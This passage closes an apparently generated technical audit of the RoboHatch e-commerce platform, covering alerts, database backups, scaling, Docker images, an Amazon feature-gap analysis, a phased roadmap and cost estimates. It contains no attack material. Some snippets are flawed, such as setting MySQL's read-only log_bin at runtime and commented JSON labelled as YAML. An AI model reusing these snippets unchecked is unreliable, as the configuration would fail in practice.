- Alert if down for > 2 minutes

**D) Alerts Configuration:**
```yaml
# alerts.yml
alerts:
  - name: High Error Rate
    condition: error_rate > 5% for 5 minutes
    notify: ['slack', 'email']
  
  - name: Slow Response Time
    condition: p95_latency > 1s for 10 minutes
    notify: ['slack']
  
  - name: Database Connection Pool Exhausted
    condition: db_pool_usage > 90%
    notify: ['pagerduty', 'email']
  
  - name: Low Disk Space
    condition: disk_usage > 85%
    notify: ['slack']
```

**Implementation Priority:** 🚨 IMMEDIATE (Week 1-2)

---

### 28. **SINGLE DATABASE - NO BACKUP STRATEGY**
**Severity:** 🔴 CRITICAL - DATA LOSS RISK

**Current State:**
- Single MySQL instance on AWS RDS / Railway
- No documented backup strategy
- No disaster recovery plan

**Required:**

**A) Automated Backups:**
```bash
# AWS RDS Automated Backups (Enable in AWS Console)
Retention: 7 days minimum
Backup Window: Off-peak hours (2-4 AM)
Multi-AZ: Enable for production
```

**B) Point-in-Time Recovery:**
```sql
-- Enable binary logging in MySQL
SET GLOBAL binlog_format = 'ROW';
SET GLOBAL log_bin = ON;
```

**C) Offsite Backups (S3):**
```bash
#!/bin/bash
# backup-db.sh (Run daily via cron)

DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="backup_${DATE}.sql.gz"

# Dump database
mysqldump -h $DB_HOST -u $DB_USER -p$DB_PASSWORD $DB_NAME | gzip > $BACKUP_FILE

# Upload to S3
aws s3 cp $BACKUP_FILE s3://robohatch-backups/mysql/$BACKUP_FILE

# Delete local copy
rm $BACKUP_FILE

# Delete backups older than 30 days
aws s3 ls s3://robohatch-backups/mysql/ | while read -r line; do
  createDate=$(echo $line | awk {'print $1" "$2'})
  createDate=$(date -d "$createDate" +%s)
  olderThan=$(date --date="30 days ago" +%s)
  if [[ $createDate -lt $olderThan ]]; then
    fileName=$(echo $line | awk {'print $4'})
    aws s3 rm s3://robohatch-backups/mysql/$fileName
  fi
done
```

**D) Disaster Recovery Test:**
- Monthly: Restore backup to staging environment
- Verify data integrity
- Document recovery time (RTO/RPO)

**Implementation Priority:** 🚨 IMMEDIATE (Week 1)

---

### 29. **NO LOAD BALANCING / AUTO-SCALING**
**Severity:** 🟡 HIGH - CANNOT HANDLE TRAFFIC SPIKES

**Current State:**
- Railway: Single container
- Vercel: Auto-scales (Good ✓)

**Problem:**
- Railway scaling is manual
- No health checks for load balancer
- No auto-scaling based on CPU/memory

**Solution (AWS ECS + ALB):**
```yaml
# ecs-task-definition.json
{
  "family": "robohatch-api",
  "cpu": "512",
  "memory": "1024",
  "containerDefinitions": [{
    "name": "api",
    "image": "robohatch/api:latest",
    "healthCheck": {
      "command": ["CMD-SHELL", "curl -f http://localhost:5000/health || exit 1"],
      "interval": 30,
      "timeout": 5,
      "retries": 3
    }
  }]
}

# auto-scaling.json
{
  "minCapacity": 2,
  "maxCapacity": 10,
  "targetValue": 70.0, # CPU utilization
  "scaleInCooldown": 300,
  "scaleOutCooldown": 60
}
```

**Implementation Priority:** 🟢 MEDIUM (Phase 2: 10k+ users)

---

### 30. **DOCKER IMAGES NOT OPTIMIZED**
**Severity:** 🟢 LOW - SLOWER BUILDS/DEPLOYMENTS

**Current Dockerfile Analysis:**
```dockerfile
FROM node:20-alpine  # ✓ Good: Alpine base
RUN npm install      # ✓ Good: Separate layer
COPY apps/api ./apps/api  # ⚠️ Could be optimized
```

**Optimization:**
```dockerfile
# Use specific version tags
FROM node:20.11.0-alpine3.19 AS builder

# Add build cache mount (BuildKit)
RUN --mount=type=cache,target=/root/.npm \
    npm ci --only=production

# Remove unnecessary files
RUN rm -rf /app/apps/api/src \
    /app/apps/api/tests \
    /app/apps/api/*.md

# Use distroless for production (even smaller)
FROM gcr.io/distroless/nodejs20-debian11
COPY --from=builder /app /app
CMD ["apps/api/dist/index.js"]
```

**Benefits:**
- Layer caching: Faster rebuilds
- Smaller image: 200MB → 100MB
- More secure: Fewer attack surfaces

**Implementation Priority:** 🟢 LOW (Week 6)

---

## 🏢 AMAZON/FLIPKART GAP ANALYSIS

### What's Missing for Amazon-Level E-Commerce:

#### **1. Product Features**
| Feature | RoboHatch | Amazon | Impact |
|---------|-----------|--------|---------|
| Product Variants | ❌ | ✅ | Cannot sell "Red M" vs "Blue L" |
| Inventory Tracking | ❌ | ✅ | Risk of overselling |
| Product Reviews | ❌ | ✅ | No social proof |
| Q&A Section | ❌ | ✅ | Customer inquiries via email |
| Wishlists | ❌ | ✅ | Lose impulse purchases |
| Compare Products | ❌ | ✅ | Hard for users to decide |
| Product Videos | ❌ | ✅ | Lower conversion |
| 360° View | ❌ | ✅ | Less confidence |
| Zoom on Images | ❌ | ✅ | Poor UX |
| Recently Viewed | ❌ | ✅ | Lost navigation |

#### **2. Search & Discovery**
| Feature | RoboHatch | Amazon | Impact |
|---------|-----------|--------|---------|
| Full-Text Search | ❌ | ✅ | Basic name search only |
| Faceted Filters | ❌ | ✅ | Can't filter by price/color/size |
| Autocomplete | ❌ | ✅ | Poor search UX |
| Search Suggestions | ❌ | ✅ | Users don't find products |
| Typo Tolerance | ❌ | ✅ | "keychain" ≠ "key chain" |
| AI Recommendations | ❌ | ✅ | No personalization |
| "Bought Together" | ❌ | ✅ | Lost upselling |
| Similar Products | ❌ | ✅ | No cross-selling |
| Trending Products | ❌ | ✅ | No merchandising |
| Search Analytics | ❌ | ✅ | Can't optimize catalog |

**Required: Elasticsearch + Recommendation Engine**
```bash
npm install @elastic/elasticsearch
```

```typescript
// services/search.service.ts
import { Client } from '@elastic/elasticsearch';

const esClient = new Client({ node: process.env.ELASTICSEARCH_URL });

export async function searchProducts(query: string, filters: any) {
  return await esClient.search({
    index: 'products',
    body: {
      query: {
        multi_match: {
          query,
          fields: ['name^3', 'description', 'tags'],
          fuzziness: 'AUTO', // Typo tolerance
        },
      },
      aggs: {
        categories: { terms: { field: 'category' } },
        price_ranges: { range: { field: 'price', ranges: [...] } },
      },
      sort: [
        { _score: 'desc' },
        { popularity: 'desc' },
      ],
    },
  });
}
```

#### **3. Checkout & Payments**
| Feature | RoboHatch | Amazon | Impact |
|---------|-----------|--------|---------|
| Guest Checkout | ❌ | ✅ | Force registration = cart abandonment |
| Multiple Addresses | ❌ | ✅ | Can't ship to work/home |
| Address Validation | ❌ | ✅ | Delivery failures |
| Saved Cards | ❌ | ✅ | Repeat customers re-enter |
| COD Option | ❌ | ✅ | Large Indian market lost |
| BNPL (Buy Now Pay Later) | ❌ | ✅ | Lower affordability |
| Gift Cards | ❌ | ✅ | No gifting option |
| Coupons/Discounts | ❌ | ✅ | No promotions |
| Wallet| ❌ | ✅ | No loyalty rewards |
| EMI Options | ❌ | ✅ | Expensive products hard to sell |

#### **4. Order Management**
| Feature | RoboHatch | Amazon | Impact |
|---------|-----------|--------|---------|
| Order Tracking | ❌ | ✅ | "Where is my order?" |
| Shipment Tracking | ❌ | ✅ | No logistics integration |
| Returns/Refunds | ❌ | ✅ | Customer service nightmare |
| Cancel Order | ❌ | ✅ | Must email support |
| Order History Export | ❌ | ✅ | No reporting for users |
| Reorder | ❌ | ✅ | Lost repeat sales |
| Invoice Generation | ❌ | ✅ | Manual invoicing |
| Shipment Notifications | ❌ | ✅ | Users check email manually |

**Required: Shiprocket/Delhivery Integration**
```typescript
// services/shipment.service.ts
import axios from 'axios';

export async function createShipment(orderId: string) {
  const order = await prisma.order.findUnique({ where: { id: orderId } });
  
  const response = await axios.post('https://apiv2.shiprocket.in/v1/external/orders/create', {
    order_id: orderId,
    order_date: order.createdAt,
    pickup_location: 'Primary',
    billing_customer_name: order.customerName,
    billing_address: order.billingAddress,
    // ... shipment details
  }, {
    headers: { Authorization: `Bearer ${SHIPROCKET_TOKEN}` },
  });
  
  await prisma.order.update({
    where: { id: orderId },
    data: {
      trackingNumber: response.data.tracking_number,
      courierName: response.data.courier_name,
    },
  });
}
```

#### **5. Admin/Operations**
| Feature | RoboHatch | Amazon | Impact |
|---------|-----------|--------|---------|
| Bulk Import Products | ❌ | ✅ | Slow catalog building |
| Bulk Stock Update | ❌ | ✅ | Manual inventory management |
| Analytics Dashboard | Basic | Advanced | Poor insights |
| Sales Reports | ❌ | ✅ | No business intelligence |
| Customer Segments | ❌ | ✅ | No targeted marketing |
| Email Campaigns | ❌ | ✅ | No retention marketing |
| Abandoned Cart Recovery | ❌ | ✅ | 70% of carts lost |
| Low Stock Alerts | ❌ | ✅ | Out of stock surprises |
| Vendor/Multi-Seller | ❌ | ✅ | Marketplace model impossible |
| Fraud Detection | ❌ | ✅ | Chargebacks unchecked |

#### **6. Mobile Experience**
| Feature | RoboHatch | Amazon | Impact |
|---------|-----------|--------|---------|
| Native App (iOS/Android) | ❌ | ✅ | 70% of traffic on mobile |
| Push Notifications | ❌ | ✅ | No re-engagement |
| Offline Mode | ❌ | ✅ | App users expect this |
| Touch ID Payment | ❌ | ✅ | Slow checkout |
| Mobile-First Design | ⚠️ Partial | ✅ | UX gaps |

#### **7. Performance & Scale**
| Metric | RoboHatch | Amazon | Gap |
|--------|-----------|--------|-----|
| Concurrent Users | ~100 | 10M+ | 100,000x |
| Page Load Time | ~2s | <0.5s | 4x slower |
| API Response Time | ~200ms | <50ms | 4x slower |
| Database Queries | N+1 issues | Optimized | Risk at scale |
| CDN Usage | ❌ | ✅ | Slow global access |
| Edge Computing | ❌ | ✅ | High latency |
| Caching Layers | ❌ | Redis + CDN | DB overload |

---

## 📈 4-PHASE SCALABILITY ROADMAP

### **PHASE 1: PRODUCTION-READY (0-10K Users) - WEEKS 1-6**

**Goal:** Fix critical issues, launch safely

**Priority: 🚨 IMMEDIATE**

**Week 1-2: Security & Data Integrity**
- ✅ Add inventory management (stockQuantity, reservedStock)
- ✅ Implement transactional order creation
- ✅ Fix JWT secret handling + rotation
- ✅ Upgrade password hashing (bcrypt 12 rounds + pepper)
- ✅ Add input validation (Joi/Zod)
- ✅ Implement XSS sanitization
- ✅ Set up monitoring (Sentry + DataDog basic)
- ✅ Implement automated backups (daily)

**Week 3-4: Payment & Core Features**
- ✅ Integrate Razorpay payment gateway
- ✅ Add webhook verification
- ✅ Implement refund system
- ✅ Add database indexes
- ✅ Set up structured logging (Winston/Pino)
- ✅ Create CI/CD pipeline (GitHub Actions)
- ✅ Add GDPR compliance (data export/delete)
- ✅ Implement product reviews

**Week 5-6: UX & SEO**
- ✅ Configure React Query properly
- ✅ Add SEO meta tags + structured data
- ✅ Generate sitemap.xml
- ✅ Optimize images (Next.js Image, WebP)
- ✅ Add error boundaries
- ✅ Implement guest checkout
- ✅ Add multiple addresses
- ✅ Create admin analytics dashboard

**Metrics:**
- Response time: <300ms (p95)
- Error rate: <0.5%
- Uptime: 99.5%
- Database connections: <50 concurrent

---

### **PHASE 2: GROWTH (10K-100K Users) - MONTHS 2-4**

**Goal:** Scale infrastructure, add advanced features

**Month 2: Caching & Performance**
- ✅ Add Redis caching layer
- ✅ Implement CDN (CloudFront)
- ✅ Set up read replicas (AWS RDS)
- ✅ Add database connection pooling
- ✅ Optimize N+1 queries
- ✅ Implement code splitting
- ✅ Add service worker (PWA)

**Month 3: Search & Discovery**
- ✅ Integrate Elasticsearch
- ✅ Build autocomplete search
- ✅ Add faceted filters
- ✅ Implement product recommendations (collaborative filtering)
- ✅ Add "Frequently Bought Together"
- ✅ Create trending products algorithm
- ✅ Add wishlist feature

**Month 4: Operations & Marketing**
- ✅ Integrate shipment tracking (Shiprocket)
- ✅ Build abandoned cart recovery (emails)
- ✅ Add email campaigns (SendGrid/SES)
- ✅ Implement coupon system
- ✅ Add customer segments
- ✅ Build analytics reports
- ✅ Implement fraud detection basics

**Infrastructure Changes:**
- Redis: ElastiCache (3-node cluster)
- Database: RDS with 2 read replicas
- API: Scale to 3-5 containers horizontally
- CDN: CloudFront with S3 origin
- Load Balancer: AWS ALB

**Metrics:**
- Response time: <150ms (p95)
- Error rate: <0.1%
- Uptime: 99.9%
- Cache hit rate: >80%
- Database query time: <50ms (p95)

---

### **PHASE 3: ENTERPRISE (100K-1M Users) - MONTHS 5-8**

**Goal:** Microservices, advanced features, global scale

**Month 5-6: Microservices Architecture**
```
Monolith → Service-Oriented Architecture

Services:
1. User Service (Auth, Profiles)
2. Product Service (Catalog, Search)
3. Order Service (Cart, Checkout, Orders)
4. Payment Service (Razorpay integration)
5. Notification Service (Email, SMS, Push)
6. Analytics Service (Tracking, Reports)
7. Admin Service (Dashboard, Operations)
```

**Communication:**
- API Gateway (Kong/AWS API Gateway)
- Message Queue (RabbitMQ/AWS SQS)
- Event Bus (Kafka for real-time)

**Month 7: Advanced Features**
- ✅ AI-powered recommendations (TensorFlow.js)
- ✅ Dynamic pricing engine
- ✅ Multi-warehouse inventory
- ✅ Vendor/marketplace model
- ✅ Mobile app (React Native)
- ✅ Voice search (Alexa/Google Assistant)
- ✅ AR product preview

**Month 8: Global Expansion**
- ✅ Multi-currency support
- ✅ Multi-language (i18n)
- ✅ Region-specific CDN
- ✅ Country-specific shipping
- ✅ Tax calculation (GST/VAT)
- ✅ Compliance (GDPR, CCPA)

**Infrastructure:**
- Multi-region deployment (AWS)
- Database sharding (by user_id hash)
- Kubernetes (EKS) for container orchestration
- Service mesh (Istio) for inter-service communication
- Distributed tracing (Jaeger)

**Metrics:**
- Response time: <100ms (p95)
- Error rate: <0.05%
- Uptime: 99.95%
- Throughput: 10K req/sec
- Database: Sharded across 5 servers

---

### **PHASE 4: HYPER-SCALE (1M+ Users) - MONTHS 9-12**

**Goal:** Amazon-level infrastructure, global scale

**Architecture:**
```
┌─────────────────────────────────────────────────────────┐
│                     Global CDN (CloudFlare)              │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│             API Gateway + DDoS Protection                │
└───────────────────────┬─────────────────────────────────┘
                        │
        ┌───────────────┼───────────────┐
        ▼               ▼               ▼
   Region: US      Region: EU    Region: APAC
   (Primary)       (Replica)      (Replica)
        │               │               │
   ┌────┴────┐     ┌────┴────┐    ┌────┴────┐
   │ Service │     │ Service │    │ Service │
   │ Cluster │     │ Cluster │    │ Cluster │
   │ (10+ K8s│     │ (10+ K8s│    │ (10+ K8s│
   │  Nodes) │     │  Nodes) │    │  Nodes) │
   └────┬────┘     └────┬────┘    └────┬────┘
        │               │               │
   ┌────┴────┐     ┌────┴────┐    ┌────┴────┐
   │Database │     │Database │    │Database │
   │ Cluster │     │ Cluster │    │ Cluster │
   │(Sharded)│────▶│(Replica)│────▶│(Replica)│
   └─────────┘     └─────────┘    └─────────┘
```

**Month 9-10: Infrastructure**
- ✅ Multi-region active-active deployment
- ✅ Global database replication (CockroachDB/Aurora Global)
- ✅ Edge computing (Lambda@Edge/CloudFlare Workers)
- ✅ Auto-scaling (CPU, memory, queue depth)
- ✅ Chaos engineering (simulate failures)
- ✅ Blue-green deployments

**Month 11: AI & Personalization**
- ✅ ML-powered product ranking
- ✅ Personalized homepage per user
- ✅ Dynamic bundle creation
- ✅ Churn prediction
- ✅ Lifetime value modeling
- ✅ Price optimization
- ✅ Inventory forecasting

**Month 12: Advanced Operations**
- ✅ Real-time fraud detection (ML)
- ✅ Dynamic inventory allocation
- ✅ Predictive shipping (ship before order!)
- ✅ Customer service chatbot (AI)
- ✅ Voice commerce integration
- ✅ Social commerce (Instagram/WhatsApp)
- ✅ Subscription boxes

**Metrics:**
- Response time: <50ms (p95)
- Error rate: <0.01%
- Uptime: 99.99% (4.3 min downtime/month)
- Throughput: 100K req/sec
- Global latency: <100ms from anywhere

---

## 🎯 FINAL RECOMMENDATIONS

### **Immediate Action Items (This Week)**
1. Add inventory management schema + migration
2. Fix order creation transaction
3. Upgrade JWT secret handling
4. Add input validation (Joi)
5. Set up Sentry error tracking
6. Configure automated daily backups

### **This Month**
7. Integrate Razorpay payment gateway
8. Add database indexes
9. Implement structured logging
10. Set up CI/CD pipeline
11. Add SEO optimization
12. Deploy monitoring dashboard

### **Next 3 Months**
13. Add Redis caching layer
14. Integrate Elasticsearch for search
15. Build product recommendation engine
16. Add shipment tracking integration
17. Implement email campaigns
18. Create mobile Progressive Web App

### **6-12 Months**
19. Migrate to microservices architecture
20. Deploy multi-region infrastructure
21. Build native mobile apps (iOS/Android)
22. Implement AI-powered features
23. Add marketplace/vendor model
24. Global expansion (multi-currency, multi-language)

---

## 📊 COST ESTIMATE

### **Current (MVP - 0-10K Users)**
- Vercel Hobby: $0
- Railway Hobby: $5/mo
- AWS RDS db.t3.micro: $15/mo
- AWS S3: $5/mo
- **Total: ~$25/month**

### **Phase 1 (10K Users)**
- Vercel Pro: $20/mo
- Railway Pro: $20/mo
- AWS RDS db.t3.small: $30/mo
- AWS S3 + CloudFront: $20/mo
- Sentry: $26/mo
- SendGrid: $15/mo
- **Total: ~$131/month**

### **Phase 2 (100K Users)**
- Vercel Pro: $20/mo
- AWS ECS (5 containers): $150/mo
- AWS RDS db.r6g.large + replicas: $500/mo
- ElastiCache (Redis): $50/mo
- Elasticsearch Service: $100/mo
- CloudFront CDN: $50/mo
- Monitoring (Datadog): $100/mo
- Shiprocket: Variable (per shipment)
- **Total: ~$970/month + variable**

### **Phase 3 (1M Users)**
- AWS EKS (Kubernetes): $500/mo
- RDS Aurora Global: $2000/mo
- ElastiCache: $300/mo
- Elasticsearch: $500/mo
- CloudFront: $300/mo
- Monitoring: $500/mo
- SMS/Email: $200/mo
- **Total: ~$4,300/month + variable**

### **Phase 4 (10M+ Users)**
- Multi-region Kubernetes: $5000/mo
- Global database cluster: $10,000/mo
- Caching & CDN: $2000/mo
- Monitoring & Analytics: $2000/mo
- ML/AI infrastructure: $1000/mo
- Third-party services: $1000/mo
- **Total: ~$21,000/month + variable**

---

## ✅ AUDIT COMPLETE

**Total Issues Identified:** 30 critical/high/medium items

**Critical (Immediate):** 8 issues
- ❌ No inventory management
- ❌ No transaction safety
- ❌ Weak password hashing
- ❌ JWT security issues
- ❌ No input validation
- ❌ No payment gateway
- ❌ Missing monitoring
- ❌ No backup strategy

**High (This Month):** 14 issues
- ⚠️ Missing database indexes
- ⚠️ No caching layer
- ⚠️ Console.log logging
- ⚠️ Security headers gaps
- ⚠️ File upload vulnerabilities
- ⚠️ XSS protection
- ⚠️ Vulnerable JWT storage
- ⚠️ GDPR compliance
- ⚠️ No CI/CD pipeline
- ⚠️ No load balancing
- ⚠️ SEO missing
- ⚠️ React Query unused
- ⚠️ No code splitting
- ⚠️ Image optimization

**Medium (Next Quarter):** 8 issues

---

## 📞 NEXT STEPS

1. **Review this audit** with your team
2. **Prioritize items** based on business impact
3. **Create GitHub issues** for each item
4. **Assign owners** to each issue
5. **Set milestones** (Week 1, Month 1, Quarter 1)
6. **Track progress** weekly
7. **Re-audit** every 3 months

**Questions? Need clarification on any section?**

---

**Audit Conducted:** February 11, 2026  
**Report Version:** 1.0  
**Next Review:** May 11, 2026
